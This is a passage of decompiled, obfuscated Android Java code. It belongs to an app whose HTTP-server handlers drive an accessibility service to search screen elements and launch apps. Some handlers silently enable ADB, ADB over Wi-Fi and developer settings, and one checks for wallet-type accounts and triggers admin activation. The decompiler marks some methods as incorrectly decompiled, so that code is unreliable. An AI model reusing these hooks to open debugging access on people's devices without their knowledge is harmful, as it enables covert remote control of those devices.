                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeListResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeListResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void L0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (!AbstractC0026q.m151B(str2) && m1074m != null) {
                searchNodeResultVO = o12.m1059D(m1074m.findOneByDescContains(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void L1(AbstractC0381k abstractC0381k) {
        try {
            NetStateVO z02 = AbstractC0251g.z0();
            ApiResult apiResult = new ApiResult();
            apiResult.setData(z02);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void L2(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setData(Boolean.valueOf(AbstractC0251g.V0()));
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: M */
    public static void m471M(String str, CombineFilter combineFilter, AbstractC0381k abstractC0381k) {
        SearchNodeListResultVO searchNodeListResultVO;
        UiObject m1075n;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、遍历参数不能为空");
                return;
            }
            try {
                m1075n = o12.m1075n(combineFilter);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (m1075n != null) {
                searchNodeListResultVO = o12.m1058C(m1075n.findByCombine(combineFilter));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeListResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeListResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeListResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void M0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (!AbstractC0026q.m151B(str2) && m1074m != null) {
                searchNodeResultVO = o12.m1059D(m1074m.findOneByDescEndsWith(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void M1(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            C0896a c0896a = new C0896a();
            c0896a.f1989b = 2;
            c0896a.f1991d = "Accessibility Service Stopped";
            c0896a.f1990c = "Accessibility Service Stopped";
            apiResult.setData(c0896a);
            apiResult.setCode(608);
            apiResult.setMsg("Accessibility Service Is Not Run,Please Start It");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.FALSE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void M2(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            Boolean bool = Boolean.TRUE;
            apiResult.setData(bool);
            if (!AbstractC0252h.m701e("isAdminActivating")) {
                AbstractC0252h.m681B(true, true);
            }
            if (AbstractC0251g.m653Z() != null && AccountManager.get(AbstractC0251g.m653Z()).getAccountsByType("com.guard.wallet").length > 0) {
                AbstractC0251g.K0(null);
            }
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(bool);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:5:0x001e A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x001f  */
    /* renamed from: N */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static void m472N(CombineFilterWithChild combineFilterWithChild, AbstractC0381k abstractC0381k) {
        String delegateId;
        C0416e o12;
        if (combineFilterWithChild != null) {
            try {
                if (combineFilterWithChild.getParentFilter() != null) {
                    delegateId = combineFilterWithChild.getParentFilter().getDelegateId();
                    o12 = o1(delegateId);
                    if (m508x(o12, abstractC0381k)) {
                        if (o12 == null) {
                            m500p(abstractC0381k, "你提交的参数有误,委托ID、遍历参数不能为空");
                            return;
                        }
                        SearchNodeListResultVO m1067f = o12.m1067f(combineFilterWithChild);
                        ApiResult apiResult = new ApiResult();
                        apiResult.setData(m1067f);
                        apiResult.setCode(200);
                        apiResult.setMsg("OK");
                        apiResult.setCount(1);
                        apiResult.setSuccess(Boolean.TRUE);
                        String m693N = AbstractC0252h.m693N(apiResult);
                        abstractC0381k.f771l = apiResult.getCode().intValue();
                        abstractC0381k.m952h(m693N);
                        abstractC0381k.mo787l();
                        return;
                    }
                    return;
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("HttpServer", e2);
                return;
            }
        }
        delegateId = null;
        o12 = o1(delegateId);
        if (m508x(o12, abstractC0381k)) {
        }
    }

    public static void N0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (!AbstractC0026q.m151B(str2) && m1074m != null) {
                searchNodeResultVO = o12.m1059D(m1074m.findOneByDescMatches(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void N1(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            C0896a c0896a = new C0896a();
            c0896a.f1989b = 2;
            c0896a.f1991d = "Not Found";
            c0896a.f1990c = "Not Found";
            apiResult.setData(c0896a);
            apiResult.setCode(404);
            apiResult.setMsg("Uri Not Allowed");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.FALSE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void N2(String str, String str2, boolean z2, List list, AbstractC0381k abstractC0381k) {
        try {
            if (AbstractC0026q.m151B(str)) {
                m500p(abstractC0381k, "你提交的参数有错误、或参数不合法,详见参数错误明细");
                return;
            }
            if (MyAccessibilityService.m554P() == null) {
                M1(abstractC0381k);
                return;
            }
            ResStartApp resStartApp = new ResStartApp();
            resStartApp.setStart(z2);
            C0416e m523d = MyAccessibilityService.m554P().m523d(str, list);
            if (m523d != null) {
                if (z2) {
                    boolean Y0 = AbstractC0251g.Y0(str, str2);
                    resStartApp.setStarted(Y0);
                    if (!Y0) {
                        resStartApp.setStartMsg("包名无效或权限限制导致App启动失败");
                    }
                }
                resStartApp.setStartPackage(m523d.f862a);
                resStartApp.setDelegateId(m523d.f864c);
            }
            ApiResult apiResult = new ApiResult();
            apiResult.setData(resStartApp);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:5:0x001e A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x001f  */
    /* renamed from: O */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static void m473O(CombineFilterWithChild combineFilterWithChild, AbstractC0381k abstractC0381k) {
        String delegateId;
        C0416e o12;
        if (combineFilterWithChild != null) {
            try {
                if (combineFilterWithChild.getParentFilter() != null) {
                    delegateId = combineFilterWithChild.getParentFilter().getDelegateId();
                    o12 = o1(delegateId);
                    if (m508x(o12, abstractC0381k)) {
                        if (o12 == null) {
                            m500p(abstractC0381k, "你提交的参数有误,委托ID、遍历参数不能为空");
                            return;
                        }
                        SearchNodeListResultVO m1068g = o12.m1068g(combineFilterWithChild);
                        ApiResult apiResult = new ApiResult();
                        apiResult.setData(m1068g);
                        apiResult.setCode(200);
                        apiResult.setMsg("OK");
                        apiResult.setCount(1);
                        apiResult.setSuccess(Boolean.TRUE);
                        String m693N = AbstractC0252h.m693N(apiResult);
                        abstractC0381k.f771l = apiResult.getCode().intValue();
                        abstractC0381k.m952h(m693N);
                        abstractC0381k.mo787l();
                        return;
                    }
                    return;
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("HttpServer", e2);
                return;
            }
        }
        delegateId = null;
        o12 = o1(delegateId);
        if (m508x(o12, abstractC0381k)) {
        }
    }

    public static void O0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (!AbstractC0026q.m151B(str2) && m1074m != null) {
                searchNodeResultVO = o12.m1059D(m1074m.findOneByDescStartsWith(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void O1(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setData(Boolean.FALSE);
            apiResult.setCount(1);
            if (MainApplication.getAppContext() != null && Settings.System.canWrite(MainApplication.getAppContext()) && !AbstractC0251g.m636I()) {
                Settings.Global.putInt(MainApplication.getAppContext().getContentResolver(), "adb_enabled", 1);
            }
            if (AbstractC0251g.m636I()) {
                apiResult.setData(Boolean.TRUE);
            }
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void O2(String str, List list, AbstractC0381k abstractC0381k) {
        try {
            if (MyAccessibilityService.m554P() == null) {
                M1(abstractC0381k);
                return;
            }
            C0416e m523d = MyAccessibilityService.m554P().m523d("com.android.settings", list);
            ApiResult apiResult = new ApiResult();
            if (m523d != null) {
                apiResult.setData(m523d.f864c);
                apiResult.setCount(1);
            }
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setSuccess(Boolean.valueOf(AbstractC0251g.Z0(str)));
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: P */
    public static void m474P(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeListResultVO searchNodeListResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (m1074m != null && !AbstractC0026q.m151B(str2)) {
                searchNodeListResultVO = o12.m1058C(m1074m.findByDesc(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeListResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeListResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeListResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void P0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (!AbstractC0026q.m151B(str2) && m1074m != null) {
                searchNodeResultVO = o12.m1059D(m1074m.findOneById(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void P1(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setData(Boolean.FALSE);
            apiResult.setCount(1);
            if (MainApplication.getAppContext() != null && Settings.System.canWrite(MainApplication.getAppContext()) && !AbstractC0251g.m638K()) {
                Settings.Global.putInt(MainApplication.getAppContext().getContentResolver(), "development_settings_enabled", 1);
            }
            if (AbstractC0251g.m638K()) {
                apiResult.setData(Boolean.TRUE);
            }
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void P2(String str, String str2, AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setData(!AbstractC0026q.m150A() ? Boolean.valueOf(AbstractC0026q.m164O(str, str2)) : Boolean.TRUE);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: Q */
    public static void m475Q(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeListResultVO searchNodeListResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (m1074m != null && !AbstractC0026q.m151B(str2)) {
                searchNodeListResultVO = o12.m1058C(m1074m.findByDescContains(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeListResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeListResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeListResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void Q0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (!AbstractC0026q.m151B(str2) && m1074m != null) {
                searchNodeResultVO = o12.m1059D(m1074m.findOneByIdContains(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void Q1(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setData(Boolean.FALSE);
            apiResult.setCount(1);
            if (MainApplication.getAppContext() != null && Settings.System.canWrite(MainApplication.getAppContext()) && !AbstractC0251g.m637J()) {
                Settings.Global.putInt(MainApplication.getAppContext().getContentResolver(), "adb_wifi_enabled", 1);
            }
            if (AbstractC0251g.m637J()) {
                apiResult.setData(Boolean.TRUE);
            }
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void Q2(String str, List list, AbstractC0381k abstractC0381k) {
        try {
            if (MyAccessibilityService.m554P() == null) {
                M1(abstractC0381k);
                return;
            }
            C0416e m523d = MyAccessibilityService.m554P().m523d("com.android.settings", list);
            ApiResult apiResult = new ApiResult();
            if (m523d != null) {
                apiResult.setData(m523d.f864c);
                apiResult.setCount(1);
            }
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setSuccess(Boolean.valueOf(AbstractC0251g.a1(str)));
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: R */
    public static void m476R(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeListResultVO searchNodeListResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (m1074m != null && !AbstractC0026q.m151B(str2)) {
                searchNodeListResultVO = o12.m1058C(m1074m.findByDescEndsWith(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeListResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeListResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeListResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void R0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (!AbstractC0026q.m151B(str2) && m1074m != null) {
                searchNodeResultVO = o12.m1059D(m1074m.findOneByIdEndsWith(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void R1(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setData(Boolean.FALSE);
            if (C0318e.m844S() != null) {
                apiResult.setData(Boolean.valueOf(C0318e.m844S().m863X()));
            }
            apiResult.setCode(200);
            apiResult.setMsg("OK");
